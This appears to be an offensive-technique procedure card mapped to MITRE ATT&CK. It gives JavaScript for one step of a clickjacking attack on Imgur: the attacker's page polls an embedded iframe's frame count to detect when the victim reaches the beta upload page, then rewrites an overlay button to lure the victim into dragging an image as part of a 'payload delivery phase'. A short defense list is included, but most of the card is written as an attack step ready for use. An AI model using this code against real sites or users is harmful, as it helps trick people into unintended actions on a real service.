---
id: proc-imgur-frame-monitor
tags:
  - frame-monitoring
  - page-detection
  - javascript-interval
type: procedure
tools:
  - '[[tools/firefox-browser]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/setinterval-monitor-frames]]'
  - '[[commands/onload-log-frame-count]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:13.054Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Monitor Iframe Frames to Detect Upload Page

## Summary

This procedure uses JavaScript to poll the iframe's frame count, detecting when the victim navigates to the beta image upload page (characterized by 1 frame vs. >3 on normal pages), triggering UI updates for further interaction.

## Description

In the clickjacked iframe, normal Imgur pages have multiple nested frames, but the beta upload page has only one. An interval checks contentWindow.frames.length to detect this change, updating the attacker's UI to prompt the next step. This relies on the victim interacting via the overlaid elements. Expected outcome: Automatic detection logs and UI changes upon upload page load.

## Requirements

1. Active clickjacked iframe from previous procedure
2. JavaScript execution in attacker's page context
3. Victim navigation induced by clickjacking

## Defense

Defensive measures and detection strategies:

- CSP to restrict frame embedding and script execution
- Monitor console for unusual frame polling
- Rate-limit embed endpoint requests
- Audit beta feature for frame anomalies

## Objectives

1. Identify upload page load for timing attacks
2. Sequence user prompts dynamically
3. Enable payload delivery phase

## Instructions

### Step 1: Set Up Frame Monitoring Interval

**Context**: Poll every second to check frame count and detect upload page.

**Command** ([[commands/setinterval-monitor-frames]]):
```javascript
let x = 0; let i = 0;
setInterval(function() {
  if (x != 1) {
    if (ifr.contentWindow.frames.length == 1) {
      console.log('page change!');
      btn1.innerHTML = 'drag the image to here!';
      x = 1;
    }
  }
  if (i == 2) { console.log('stop counter...'); }
  i++;
}, 1000);
```

> Monitors and updates UI on detection. Expected output: Console "page change!" and button text change.

### Step 2: Log Initial Frame Count on Load

**Context**: Baseline frame count upon iframe load.

**Command** ([[commands/onload-log-frame-count]]):
```javascript
ifr.onload = function() {
  console.log(ifr.contentWindow.frames.length);
};
```

> Logs frames on load. Expected output: Number like >3 for normal pages.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

- None

## Commands Used

- [[commands/setinterval-monitor-frames]]
- [[commands/onload-log-frame-count]]

## Tools Used

- [[tools/firefox-browser]]

## Tags

- frame-detection
- javascript-polling
